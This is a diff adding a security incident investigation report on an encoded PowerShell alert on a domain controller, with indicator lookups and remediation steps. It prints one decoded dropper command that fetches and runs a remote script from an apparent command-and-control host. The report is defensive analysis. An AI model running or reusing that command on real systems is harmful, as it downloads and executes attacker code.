@@ -1,0 +1,87 @@
+## Investigation Summary
+
+### Alert Classification and Severity Assessment
+- **Alert Type:** High severity PowerShell-based defense evasion attack
+- **Risk Score:** 87/100
+- **MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
+- **Target:** Domain Controller (DC01.corp.widgets-inc.com)
+
+### Decoded PowerShell Command
+The base64 encoded command decodes to:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
+```
+This is a classic malware dropper pattern attempting to download and execute a remote PowerShell script.
+
+### Indicators of Compromise Analysis
+
+#### 1. IP Address: 198.51.100.99
+**Risk Assessment: LOW**
+- **VirusTotal:** 0/94 engines flagged as malicious, marked as "private" and "TEST-NET-1"
+- **AbuseIPDB:** 0% abuse confidence score, marked as "Reserved" usage type
+- **Analysis:** This is a reserved IP address (RFC 5737) used for documentation and testing purposes. It should never appear in live network traffic, making its presence highly suspicious.
+
+#### 2. Domain: c2-relay.darkops.net
+**Risk Assessment: HIGH**
+- **VirusTotal:** 0/94 engines flagged (likely due to being newly registered or not yet analyzed)
+- **Domain Analysis:** 
+  - Tagged as "dga" (Domain Generation Algorithm)
+  - Registered with EurotrashNames.com LLC
+  - Created: 2013-11-28, Expires: 2024-11-28 (recently expired)
+  - Uses privacy masking for registrant details
+  - Name suggests command-and-control infrastructure ("c2-relay", "darkops")
+
+#### 3. URL: https://c2-relay.darkops.net/stager.ps1
+**Risk Assessment: HIGH**
+- **VirusTotal:** URL not found in database (404 error)
+- **Analysis:** The URL path "/stager.ps1" is consistent with malware staging operations
+
+#### 4. File Hash: de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c
+**Risk Assessment: LOW (Legitimate Binary)**
+- **VirusTotal:** 0/71 engines flagged as malicious
+- **Analysis:** This is a legitimate Microsoft PowerShell executable (PowerShell.EXE)
+- **Signature:** Verified Microsoft signature
+- **Verdict:** Microsoft Corporation "goodware"
+- **Note:** The binary itself is legitimate; the threat comes from how it's being used
+
+### Additional Context Indicators
+- **Source IP:** 10.0.1.10 (internal network - domain controller)
+- **User Context:** SYSTEM (highest privileges)
+- **Parent Process:** cmd.exe (common attack vector)
+- **Execution Flags:** -NoProfile, -ExecutionPolicy Bypass, -WindowStyle Hidden (classic evasion techniques)
+
+### Overall Verdict: **TRUE POSITIVE**
+
+This is a confirmed malicious activity based on:
+
+1. **High-confidence attack pattern:** Encoded PowerShell command with execution policy bypass
+2. **Malicious intent:** Attempting to download and execute remote payload
+3. **Suspicious infrastructure:** Domain name suggests C2 operations
+4. **Critical target:** Domain controller compromise
+5. **Privilege escalation:** Running as SYSTEM user
+6. **Evasion techniques:** Hidden window, bypassed execution policy
+
+### Recommended Next Steps
+
+**IMMEDIATE (Priority 1):**
+1. **Isolate DC01** from the network immediately to prevent lateral movement
+2. **Block domain c2-relay.darkops.net** at DNS and firewall level
+3. **Terminate PowerShell process PID 4128** if still running
+4. **Check for persistence mechanisms** (scheduled tasks, registry run keys, services)
+
+**SHORT-TERM (Priority 2):**
+5. **Hunt for similar PowerShell executions** across the environment using the same patterns
+6. **Analyze DC01 for signs of compromise** (unusual processes, network connections, file modifications)
+7. **Review authentication logs** for suspicious logons around the incident time
+8. **Check for data exfiltration** attempts from DC01
+
+**MEDIUM-TERM (Priority 3):**
+9. **Conduct full forensic imaging** of DC01 before remediation
+10. **Reset all domain admin credentials** as a precautionary measure
+11. **Review and strengthen PowerShell execution policies**
+12. **Implement additional monitoring** for encoded PowerShell commands
+
+**INVESTIGATION NOTES:**
+- The use of a reserved IP address (198.51.100.99) suggests this may be a test or simulation, but should be treated as real until confirmed otherwise
+- The domain appears to be expired, which may explain why the payload download failed
+- Focus investigation on how the initial access was obtained and whether the attack succeeded despite the apparent infrastructure issues
